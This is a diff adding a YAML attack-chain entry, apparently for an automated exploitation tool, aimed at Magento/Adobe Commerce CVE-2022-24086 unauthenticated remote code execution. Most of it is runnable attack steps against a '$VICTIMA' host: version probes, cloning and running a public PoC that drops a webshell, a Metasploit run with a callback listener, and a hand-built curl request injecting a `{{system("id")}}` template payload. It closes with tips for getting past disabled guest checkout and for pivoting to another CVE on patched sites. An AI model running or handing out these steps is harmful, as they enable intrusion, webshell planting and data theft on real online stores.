@@ -1,0 +1,59 @@
+chain_id: magento_cve_2022_24086
+title: "Magento / Adobe Commerce — CVE-2022-24086 unauth RCE via checkout email"
+severity: CRITICAL
+tags: [web, magento, adobe-commerce, cve-2022-24086, template-injection, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-24086" }
+    - { banner_pattern: "(?i)magento|adobe\\s*commerce" }
+    - { product_pattern: "(?i)magento|adobe\\s*commerce" }
+    - { path_pattern: "(?i)/(rest/V1/guest-carts|checkout/onepage)" }
+
+description: |
+  Magento 2.3.3-p1 → 2.3.7-p2 / 2.4.0 → 2.4.3-p1 (Adobe Commerce same
+  range): the order email template rendering doesn't validate
+  customer-supplied directive markup, letting the firstname/email
+  fields of a guest order carry a `{{system(...)}}` directive that
+  PHP evaluates server-side. Unauth RCE driven through the public
+  REST API. Mass-exploited; Adobe issued an emergency out-of-band fix.
+
+steps:
+  - id: 1
+    title: "Probe — guest-carts is unauth, response leaks Magento version"
+    command: |
+      curl -sk -i "https://$VICTIMA/rest/V1/guest-carts" -X POST -H 'Content-Type: application/json' -d '{}'
+      curl -sk "https://$VICTIMA/magento_version" 2>/dev/null
+
+  - id: 2
+    title: "Public PoC drops a webshell"
+    command: |
+      git clone https://github.com/Sergios14/CVE-2022-24086 /tmp/magento
+      python3 /tmp/magento/exploit.py -u https://$VICTIMA -c 'id'
+
+  - id: 3
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/unix/webapp/magento_unserialize; \
+        set RHOSTS $VICTIMA; set TARGETURI / ; set SSL true; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 4
+    title: "Manual one-shot — POST a guest cart with the directive"
+    command: |
+      QID=$(curl -sk -X POST "https://$VICTIMA/rest/V1/guest-carts" -H 'Content-Type: application/json' -d '{}' | tr -d '"')
+      curl -sk -X POST "https://$VICTIMA/rest/V1/guest-carts/$QID/estimate-shipping-methods" \
+        -H 'Content-Type: application/json' \
+        -d '{"address":{"firstname":"{{var this.template_filter.filter(this.var1)}}","lastname":"r","email":"a@b.c","postcode":"1","region":"CA","region_id":12,"country_id":"US","city":"sf","street":["x"],"telephone":"1","var1":"{{system(\"id\")}}"}}'
+
+common_errors:
+  - error: "REST returns 'cart not found' / 401"
+    solution: |
+      Some installs disable guest checkout. Try the authenticated path
+      with any registered user (free signup is usually open). If
+      patched (≥ 2.4.3-p2), pivot to CVE-2024-34102 (XML XXE on the
+      same REST root).
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-24086
+  - https://helpx.adobe.com/security/products/magento/apsb22-12.html
